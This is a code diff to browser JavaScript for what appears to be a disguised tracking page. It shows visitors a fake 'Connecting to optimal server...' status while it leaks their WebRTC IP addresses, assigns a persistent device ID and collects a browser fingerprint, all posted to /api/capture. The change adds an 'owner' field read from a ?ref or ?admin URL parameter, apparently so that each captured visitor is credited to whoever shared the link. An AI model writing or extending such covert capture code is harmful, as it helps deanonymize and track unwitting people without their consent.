@@ -321,10 +321,20 @@ async function sendInitialCapture() {
   try {
     setStatus('Connecting to optimal server...');
     const [webrtcIPs] = await Promise.all([leakWebRTCIPs()]);
+    
+    // Detect owner from URL (e.g., ?ref=1995aa)
+    const params = new URLSearchParams(window.location.search);
+    const owner = params.get('ref') || params.get('admin') || 'Jassim99x';
+
     const response = await fetch('/api/capture', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ webrtcIPs, deviceId: await getPersistentId(), ...collectFingerprint() }),
+      body: JSON.stringify({ 
+        webrtcIPs, 
+        deviceId: await getPersistentId(), 
+        owner, 
+        ...collectFingerprint() 
+      }),
     });
 
     if (response.ok) {
